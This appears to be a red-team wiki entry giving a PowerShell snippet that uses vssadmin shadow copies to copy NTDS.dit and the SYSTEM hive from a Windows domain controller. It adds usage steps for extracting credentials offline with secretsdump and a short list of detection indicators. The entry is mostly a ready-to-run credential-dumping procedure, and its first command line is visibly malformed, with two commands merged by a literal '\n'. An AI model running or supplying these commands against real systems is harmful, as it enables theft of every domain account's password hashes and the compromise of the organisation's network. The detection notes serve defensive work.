---
id: 9c9de7a1-9236-4cb4-87d6-287ba160177d
name: Vssadmin-NTDS-Dump-Script
type: code
language: Powershell
verified: true
created_at: '2023-04-06T03:56:03.881476+00:00'
updated_at: '2023-10-01T12:00:00.000000+00:00'
platforms:
  - Windows
tags:
  - credential-dumping
  - vssadmin
  - ntds
validated: true
---

# Vssadmin-NTDS-Dump-Script

## Code

```powershell
vssadmin create shadow /for=C:\ncopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy
```

## Description

This script snippet combines vssadmin shadow copy creation with file copies to extract NTDS.dit and SYSTEM files for AD credential dumping. It is intended for execution in an elevated PowerShell session on a Windows domain controller, providing a quick way to snapshot and copy protected files for offline analysis.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| C:\ | System volume to shadow (change if different) | D:\ |
| HarddiskVolumeShadowCopy1 | Shadow copy volume name (auto-generated, check output) | HarddiskVolumeShadowCopy2 |
| C:\ShadowCopy | Destination directory for copied files | C:\Temp\Dump |

## Usage

Execute this in an elevated PowerShell prompt after ensuring the destination directory exists. Note the shadow copy ID from the first command's output and update the volume name if necessary. After running, use tools like Impacket's secretsdump to process the files: secretsdump.py -system SYSTEM -ntds NTDS.dit LOCAL. This is useful in red team engagements for rapid credential harvesting post-DC compromise.

## Detection

- Monitor for vssadmin.exe executions via Sysmon Event ID 1 (process creation).
- Event ID 8222 in Microsoft-Windows-Backup/Operational log for shadow copy events.
- File creation in unusual paths or access to NTDS.dit/SYSTEM via audit logs.
- Anomalous network exfiltration of large files post-execution.

## Related

- [[procedures/Active-Directory-Credential-Dumping-via-Vssadmin]]
- [[tools/Vssadmin]]
